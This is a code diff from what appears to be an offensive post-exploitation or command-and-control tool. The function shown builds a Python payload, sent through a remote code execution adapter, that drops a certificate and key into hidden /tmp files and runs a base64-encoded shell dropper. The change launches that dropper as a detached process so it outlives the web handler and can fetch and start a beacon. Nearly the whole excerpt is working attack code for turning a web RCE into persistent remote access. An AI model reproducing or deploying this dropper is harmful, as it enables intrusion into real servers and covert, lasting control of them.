@@ -3223,13 +3223,21 @@ def _beacon_via_rce_adapter(wm, slots):
         # The dropper is launched DETACHED: the web handler kills its
         # subprocess after a few seconds, so it must survive to finish
         # downloading/starting the beacon.
-        payload = ("import os,base64\n"
+        payload = ("import base64,subprocess\n"
                    f"open('/tmp/.pcrt','wb').write("
                    f"base64.b64decode('{cert_b64}'))\n"
                    f"open('/tmp/.pkey','wb').write("
                    f"base64.b64decode('{key_b64}'))\n"
-                   f"os.system('(echo {b64} | base64 -d | sh) "
-                   ">/dev/null 2>&1 &')\n")
+                   # argv, not a shell string: the dropper is handed to sh as
+                   # ONE -c argument, so nothing in the operator-generated
+                   # command can be re-split by word expansion. The detachment
+                   # is stronger than the old trailing `&`: a new session plus
+                   # /dev/null stdio survives the web handler reaping its own
+                   # children after a few seconds (same lifetime as before).
+                   f"subprocess.Popen(['/bin/sh','-c',"
+                   f"'echo {b64} | base64 -d | sh'],"
+                   "stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,"
+                   "stderr=subprocess.DEVNULL,start_new_session=True)\n")
         with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as tf:
             tf.write(payload)
             tmp = tf.name
